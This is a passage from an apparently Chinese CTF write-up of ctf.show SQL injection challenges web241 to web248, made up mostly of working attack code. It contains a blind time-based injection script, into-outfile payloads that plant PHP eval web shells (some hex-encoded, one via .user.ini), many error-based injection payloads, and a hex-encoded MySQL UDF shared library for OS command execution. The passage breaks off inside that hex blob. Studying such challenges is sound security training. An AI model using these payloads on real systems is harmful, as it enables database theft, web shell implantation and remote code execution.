response_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>flag_url<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>response_flag<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] No flag found in the response."</span><span class="token punctuation">)</span></code></pre><h4 id="web241-deleteæ³¨å…¥"><a href="#web241-deleteæ³¨å…¥" class="headerlink" title="web241(deleteæ³¨å…¥)"></a>web241(deleteæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ é™¤è®°å½•</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></code></pre><p>ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://01d94186-8d77-44ea-a4c9-c70d61770349.challenge.ctf.show/api/delete.php"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥æ•°æ®åº“  banlist,ctfshow_user,flag</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥è¡¨å  id,flag,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'"</span>        <span class="token comment"># æŸ¥æ•°æ®</span>        payload <span class="token operator">=</span> <span class="token string">"select flag from flag"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web242-fileæ³¨å…¥"><a href="#web242-fileæ³¨å…¥" class="headerlink" title="web242(fileæ³¨å…¥)"></a>web242(fileæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¤‡ä»½è¡¨</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>åˆ©ç”¨info outfileçš„æ‰©å±•å‚æ•°æ¥åšé¢˜</p><ul><li>SELECT â€¦ INTO OUTFILE â€˜file_nameâ€™<br>    [CHARACTER SET charset_name]<br>    [export_options]</li><li>export_options:<br>[{FIELDS | COLUMNS}<br>    [TERMINATED BY â€˜stringâ€™]&#x2F;&#x2F;åˆ†éš”ç¬¦<br>    [[OPTIONALLY] ENCLOSED BY â€˜charâ€™]<br>    [ESCAPED BY â€˜charâ€™]<br>]<br>[LINES<br>    [STARTING BY â€˜stringâ€™]<br>    [TERMINATED BY â€˜stringâ€™]<br>]</li></ul><p><strong>OPTION</strong>å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼š</p><ul><li><p><code>FIELDS TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;</code>ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚</p></li><li><p><code>FIELDS ENCLOSED BY &#39;å­—ç¬¦&#39;</code>ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚</p></li><li><p><code>FIELDS OPTIONALLY ENCLOSED BY &#39;å­—ç¬¦&#39;</code>ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½CHARã€VARCHARå’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚</p></li><li><p><code>FIELDS ESCAPED BY &#39;å­—ç¬¦&#39;</code>ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\â€ã€‚</p></li><li><p>*<code>LINES STARTING BY &#39;å­—ç¬¦ä¸²&#39;</code>*ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚</p></li><li><p>*<code>LINES TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;</code>*ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚</p></li></ul><p>å¯ä»¥å†™é©¬çš„å‚æ•°æœ‰ï¼š</p><p><code>FIELDS TERMINATED BY</code>ã€ <code>LINES STARTING BY</code>ã€ <code>LINES TERMINATED BY</code></p><p>åœ¨<code>url/api/dump.php</code>ä¸‹å†™é©¬</p><p>é©¬åœ¨url&#x2F;dump&#x2F;1.php</p><pre class="language-php" data-language="php"><code class="language-php">filename=1.php' LINES STARTING BY "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>";#</code></pre><p>å‘½ä»¤è¡Œåˆ°æ ¹ç›®å½•è¾“å…¥</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h4 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤äº†php</span></code></pre><p>å…ˆä¸Šiniï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653a312e6a7067;## auto_prepend_file:1.jpg</code></pre><p>æ³¨æ„16è¿›åˆ¶æ˜¯ä¸ºäº†0a(æ¢è¡Œ)å‘æŒ¥ä½œç”¨ï¼Œè€Œ<code>starting by â€œ;â€ï¼Œ</code>æ˜¯æƒ³è®©æ¯è¡Œæ•°æ®çš„å¼€å¤´å­—ç¬¦éƒ½æ˜¯åˆ†å·ï¼Œæ˜¯ä¸ºäº†è®©å‰é¢çš„é‚£ä¸ª</p><p><code>select * from ctfshow_user</code>æŸ¥å‡ºæ¥çš„ä¸œè¥¿ä¸åé¢çš„åšä¸ªäº†æ–­ï¼Œç„¶åä¸ŠğŸ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0x3c3f3d6576616c28245f504f53545b315d293b3f3e;## &lt;?&#x3D;eval($_POST[1]);?&gt;</code></pre><p>ï¼ˆåšäº†åŠå¤©ä¸€ç›´403ï¼Œçœ‹åˆ°æœ‰ä¸€ä½å¸ˆå‚…ä¹Ÿæ˜¯ä¸€æ ·ï¼Œäºæ˜¯æŠŠhttpsçš„så»æ‰å°±å¯ä»¥äº†ï¼‰</p><h4 id="web244-erroræ³¨å…¥-updatexml"><a href="#web244-erroræ³¨å…¥-updatexml" class="headerlink" title="web244(erroræ³¨å…¥  updatexml)"></a>web244(erroræ³¨å…¥  updatexml)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¤‡ä»½è¡¨</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„):å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹):æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°å…¶éƒ½æ˜¯é’ˆå¯¹xmlè·¯å¾„è¿›è¡Œçš„æ³¨å…¥</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1)+--+  # 0x7e --&gt; ~?id&#x3D;1&#39; or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+</code></pre><p>çœ‹åˆ°äº†å¥½ä¸œè¥¿</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1. floor + rand + group byselect * from user where id&#x3D;1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);select * from user where id&#x3D;1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));2. ExtractValueselect * from user where id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));3. UpdateXmlselect * from user where id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));4. Name_Const(&gt;5.0.12)select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;5. Joinselect * from(select * from mysql.user a join mysql.user b)c;select * from(select * from mysql.user a join mysql.user b using(Host))c;select * from(select * from mysql.user a join mysql.user b using(Host,User))c;6. exp()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and Exp(~(select * from (select version())a));7. geometrycollection()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));8. multipoint()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));9. polygon()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));10. multipolygon()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));11. linestring()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));12. multilinestring()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><h4 id="web245-extractvalue"><a href="#web245-extractvalue" class="headerlink" title="web245(extractvalue)"></a>web245(extractvalue)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;æ— è¿‡æ»¤è¿‡æ»¤updatexml</code></pre><p>è¿™é‡Œä½¿ç”¨extractvalue</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å ctfshow_flagsa?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))+--+# æŸ¥åˆ—å flag1?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e))+--+# getFlag?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),5,15),0x7e))+--+?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+</code></pre><h4 id="web246-floor"><a href="#web246-floor" class="headerlink" title="web246(floor)"></a>web246(floor)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ— è¿‡æ»¤</span>è¿‡æ»¤updatexml extractvalue</code></pre><p>è¿™é‡Œä½¿ç”¨floor + rand + group by ä¸»è¦åˆ©ç”¨ä¸»é”®çš„é‡å¤æ¥å®ç°æŠ¥é”™</p><p><a href="https://www.freebuf.com/column/235496.html">MysqlæŠ¥é”™æ³¨å…¥ä¹‹floor(rand(0)*2)æŠ¥é”™åŸç†æ¢ç©¶</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å ctfshow_flags?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);--+# æŸ¥åˆ—å flag2?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23# getFlag?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select flag21 from ctfshow_flags1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code></pre><h4 id="web247-åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥"><a href="#web247-åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="web247(åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥)"></a>web247(åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ— è¿‡æ»¤</span>è¿‡æ»¤updatexml extractvalue floor</code></pre><p><code>floor()ï¼šå‘ä¸‹å–æ•´</code><br><code>ceil()ï¼šå‘ä¸Šå–æ•´</code><br><code>round()ï¼šå››èˆäº”å…¥</code></p><p>flooræ›¿æ¢æˆå…¶ä»–å–æ•´å‡½æ•°å³å¯</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å ctfshow_flagsa1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# æŸ¥åˆ—å flag?1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39; limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# getFlag1&#39; and (select 1 from (select count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23</code></pre><h4 id="web248-udfæ³¨å…¥"><a href="#web248-udfæ³¨å…¥" class="headerlink" title="web248(udfæ³¨å…¥)"></a>web248(udfæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><p>mysqlçš„UAFæ³¨å…¥,ç®€å•æ¥è¯´å°±æ˜¯æŠŠdllæ–‡ä»¶å†™åˆ°ç›®æ ‡æœºå­çš„pluginç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ˜¯å¯ä»¥é€šè¿‡select @@plugin_diræ¥å¾—åˆ°çš„ã€‚æ­¤å¤–å°±æ˜¯è¿™é¢˜å¯ä»¥å †å æ³¨å…¥ï¼Œæˆ‘ä¸€å¼€å§‹æ²¡æƒ³åˆ°å¯ä»¥å †å ï¼Œä»¥ä¸ºæ˜¯å¸ƒå°”ï¼Œå…¶å®è¿˜æ˜¯æ²¡ç†è§£è¿™ä¸ªUAFæ³¨å…¥ï¼Œæœ€åçš„å¯¼å…¥å‡½æ•°è¿™é‡Œï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -æŸ¥å‡ºMysqlæ’ä»¶è·¯å¾„ï¼š&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+å¼•å…¥udf.soæ–‡ä»¶ä»è€Œåˆ›å»ºå‡½æ•°sys_eval</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;; &#x2F;&#x2F;å¯¼å…¥udfå‡½æ•°</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url <span class="token operator">=</span> <span class="token string">"https://49e6bca5-e443-47a8-9a15-8619fb62730f.challenge.ctf.show/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C6